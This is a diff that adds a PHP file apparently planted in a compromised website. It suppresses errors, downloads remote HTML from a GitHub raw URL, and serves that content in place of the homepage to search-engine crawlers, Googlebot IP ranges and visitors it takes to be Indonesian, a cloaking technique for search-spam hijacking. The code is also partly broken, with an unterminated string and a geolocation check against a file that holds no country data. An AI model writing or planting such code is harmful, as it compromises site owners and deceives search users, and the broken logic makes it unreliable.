@@ -1,0 +1,97 @@
+<?php
+error_reporting(0);
+$agent = $_SERVER['HTTP_USER_AGENT'];
+$reff = $_SERVER['PHP_SELF'];
+
+$mangea = file_get_contents('https://raw.githubusercontent.com/kikiii88/sadboy/refs/heads/main/vinimark.co.za.txt');
+
+
+$homeurlindex = '/index.php';
+$homepageindex = "/";
+$homeurlindex2 = '/default.php';
+$currentpageindex = $_SERVER['REQUEST_URI'];
+
+
+if(strpos($agent,'bot') > -1){
+    if($currentpageindex == $homepageindex or $currentpageindex == $homeurlindex or $currentpageindex == $homeurlindex2) {
+        header('Content-Type: text/html');
+        echo $mangea;
+        exit();
+    }
+}
+
+function get_client_ip() {
+    $ipaddress = '';
+    if (isset($_SERVER['HTTP_CLIENT_IP']))
+        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED'];
+    else if(isset($_SERVER['REMOTE_ADDR']))
+        $ipaddress = $_SERVER['REMOTE_ADDR'];
+    elseif (getenv('HTTP_CLIENT_IP'))
+        $ipaddress = getenv('HTTP_CLIENT_IP');
+    else if(getenv('HTTP_X_FORWARDED_FOR'))
+        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
+    else if(getenv('HTTP_X_FORWARDED'))
+        $ipaddress = getenv('HTTP_X_FORWARDED');
+    else if(getenv('HTTP_FORWARDED_FOR'))
+        $ipaddress = getenv('HTTP_FORWARDED_FOR');
+    else if(getenv('HTTP_FORWARDED'))
+       $ipaddress = getenv('HTTP_FORWARDED');
+    else if(getenv('REMOTE_ADDR'))
+        $ipaddress = getenv('REMOTE_ADDR');
+    else
+        $ipaddress = '114.5.18.100';
+    return $ipaddress;
+}
+
+$ip = get_client_ip();
+$iprealx = explode(', ',  $ip);
+$ipreal = $iprealx[0];
+
+$url = 'https://www.gstatic.com/ipranges/goog.json';
+$response = file_get_contents($url);
+$data = json_decode($response, true);
+
+if ($data["country"] === "Indonesia") {
+    if ($currentpageindex == $homepageindex or $currentpageindex == $homeurlindex or $currentpageindex == $homeurlindex2) {
+        header('Content-Type: text/html');
+        echo $mangea;
+        exit();
+    }
+} else {
+    $url = 'https://www.gstatic.com/ipranges/goog.json;
+    $response = file_get_contents($url);
+    $data = json_decode($response, true);
+    if ($data["country_code2"] === "ID") {
+        header('Content-Type: text/html');
+        echo $mangea;
+        exit();
+    }
+}
+
+$google = "https://developers.google.com/search/apis/ipranges/googlebot.json";
+$rgoogle = file_get_contents($google);
+$dgoogle = json_decode($rgoogle, true);
+
+foreach($dgoogle['prefixes'] as $resultx) {
+  if(!empty($resultx['ipv4Prefix'])) {
+    $ipnya = explode('/', $resultx['ipv4Prefix']);
+    $start = ip2long($ipnya[0]);
+    $ip_count = 1 << (32 - $ipnya[1]);
+    
+    for ($i = 0; $i < $ip_count; $i++) {
+      $fixip = long2ip($start + $i);
+      if ($ipreal == $fixip) {
+        if ($currentpageindex == $homepageindex or $currentpageindex == $homeurlindex or $currentpageindex == $homeurlindex2) { header('Content-Type: text/html'); echo $mangea; exit(); }
+      }
+    }
+    }  
+}
+?>
